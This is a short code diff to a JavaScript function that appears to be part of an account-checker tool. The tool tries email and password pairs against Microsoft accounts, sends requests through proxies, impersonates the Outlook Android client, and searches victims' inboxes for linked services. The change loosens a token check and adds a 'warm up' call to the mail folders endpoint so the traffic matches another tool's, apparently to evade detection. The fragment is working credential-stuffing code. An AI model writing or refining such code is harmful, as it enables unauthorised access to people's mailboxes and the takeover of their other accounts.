@@ -531,7 +531,7 @@ async function attemptCheck(email, password) {
 
     // ── Step 5: Search inbox for ALL services ──
     const anchor = refreshToken ? `CID:${refreshToken}` : "";
-    if (accessToken && accessToken.startsWith("Ew")) {
+    if (accessToken && accessToken.includes("Ew")) {
       const mailHeaders = {
         "User-Agent": "Outlook-Android/2.0",
         "Pragma": "no-cache",
@@ -543,6 +543,15 @@ async function attemptCheck(email, password) {
         "Connection": "Keep-Alive",
         "Accept-Encoding": "gzip",
       };
+
+      // Match SB flow: warm up folders endpoint before search
+      try {
+        await proxiedFetch("https://outlook.office.com/api/beta/me/MailFolders", {
+          method: "GET",
+          headers: mailHeaders,
+          signal: AbortSignal.timeout(10000),
+        });
+      } catch {}
 
       // Search each service
       for (const svc of SERVICES) {
